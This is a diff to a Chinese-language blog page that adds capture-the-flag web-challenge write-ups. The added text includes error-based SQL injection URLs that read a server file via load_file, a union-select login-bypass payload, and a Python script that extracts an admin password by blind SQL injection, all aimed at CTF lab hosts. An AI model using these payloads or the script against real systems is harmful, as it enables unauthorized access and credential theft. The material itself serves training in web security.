@@ -1350,9 +1350,107 @@ $KEY='ISecer:www.isecer.com';
 <pre><code>Cookie: ISecer=s:0:&quot;&quot;;
 </code></pre>
 
+<ul>
+<li>sql注入2</li>
+</ul>
+
+<p>尝试各种注入都不行，，实在解不出来看了下wp</p>
+
+<p>说是扫目录，用bbscan扫一下得到</p>
+
+<pre><code>http://120.24.86.145:8007/web2/.DS_Store
+</code></pre>
+
+<p>使用ds_store_exp解析得到flag</p>
+
+<ul>
+<li>报错注入</li>
+</ul>
+
+<pre><code>http://103.238.227.13:10088/?id=1%0aand%0aupdatexml(1,concat(0x7e,substr(load_file(0x2f7661722f746573742f6b65795f312e706870),89,31)),1)%23
+</code></pre>
+
+<pre><code>http://103.238.227.13:10088/?id=1%0aand%0aupdatexml(1,concat(0x7e,substr(load_file(0x2f7661722f746573742f6b65795f312e706870),110,31)),1)%23
+</code></pre>
+
+<ul>
+<li>trim的日记本</li>
+</ul>
+
+<p>本来以为是二次注入，，结果扫一下域名，访问show.php就出答案了</p>
+
+<ul>
+<li>login2<br /></li>
+</ul>
+
+<p>抓包发现响应头里有一个tip</p>
+
+<pre><code>tip: JHNxbD0iU0VMRUNUIHVzZXJuYW1lLHBhc3N3b3JkIEZST00gYWRtaW4gV0hFUkUgdXNlcm5hbWU9JyIuJHVzZXJuYW1lLiInIjsKaWYgKCFlbXB0eSgkcm93KSAmJiAkcm93WydwYXNzd29yZCddPT09bWQ1KCRwYXNzd29yZCkpewp9
+</code></pre>
+
+<p>解密后</p>
+
+<pre><code>$sql=&quot;SELECT username,password FROM admin WHERE username='&quot;.$username.&quot;'&quot;;
+if (!empty($row) &amp;&amp; $row['password']===md5($password)){
+}
+</code></pre>
+
+<p>然后payload</p>
+
+<pre><code>username=a' union select 1,md5(1)#'
+password=1
+</code></pre>
+
+<p>构成的sql查询语句为</p>
+
+<pre><code>$sql=&quot;SELECT username,password FROM admin WHERE username='a' union select 1,md5(1)#'&quot;;
+</code></pre>
+
+<p>大概的原理就是前面的查询查不到就执行并返回了后面的查询，所以返回的username=1，password为md5(1)</p>
+
+<p>后面的不会了，然后还没来得及接着看平台好像出问题了，login2，3，4都无法访问了 = =</p>
+
+<ul>
+<li>login3</li>
+</ul>
+
+<p>盲注，返回分别是</p>
+
+<pre><code>username does not exist!
+和
+password error!
+</code></pre>
+
+<p>脚本</p>
+
+<pre><code>#coding=utf-8
+
+import requests
+
+url = 'http://118.89.219.210:49167/index.php'
+s =requests.Session()
+pwd = ''
+
+for i in xrange(1,33):
+    for j in xrange(48,123):
+        rule = &quot;admin'^(ascii(mid((password)from(&quot;+str(i)+&quot;)))&gt;&quot;+str(j)+&quot;)#&quot;
+        data = {'username':rule,'password':&quot;admin&quot;}
+        r = s.post(url,data=data)
+        if &quot;password error&quot; in r.content:
+            pwd += chr(j)
+            print chr(j)
+            break
+print 'password:'+pwd
+
+</code></pre>
+
+<p>就是跑这个脚本的时候，平台出问题了，，不知道又没有关系</p>
+
 <hr />
 
-<h2 id="未完待续">未完待续 ~~</h2>
+<hr />
+
+<p>~~ 好了，这个web勉强也算是更完了~ ~~</p>
 
   
 <div class="prev-next-post pure-g">
@@ -1411,7 +1509,7 @@ $KEY='ISecer:www.isecer.com';
 
 
 
-<script type="text/javascript" color="0,0,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+<script type="text/javascript" color="0,0,255" opacity='0.5' zIndex="-1" count="150" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
 
 </body>
 </html>
